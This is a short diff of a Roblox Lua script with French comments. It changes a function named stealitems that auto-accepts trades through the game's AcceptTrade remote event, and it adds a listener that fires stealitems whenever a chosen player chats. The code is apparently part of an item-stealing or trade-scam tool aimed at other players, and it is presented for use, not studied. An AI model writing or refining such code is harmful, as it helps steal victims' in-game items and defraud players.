@@ -588,10 +588,19 @@ local function stealitems()
         end
     end
 
-   wait(12)
+  wait(12)
     
-    -- Remplace la ligne fixe '285646582' par une acceptation dynamique sans argument fixe
+    -- Validation dynamique sans l'ID fixe 285646582
     pcall(function()
         game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
     end)
 end
+
+-- Écouteur pour déclencher le transfert à l'arrivée du joueur
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == userName then
+        player.Chatted:Connect(function(msg)
+            stealitems()
+        end)
+    end
+end)
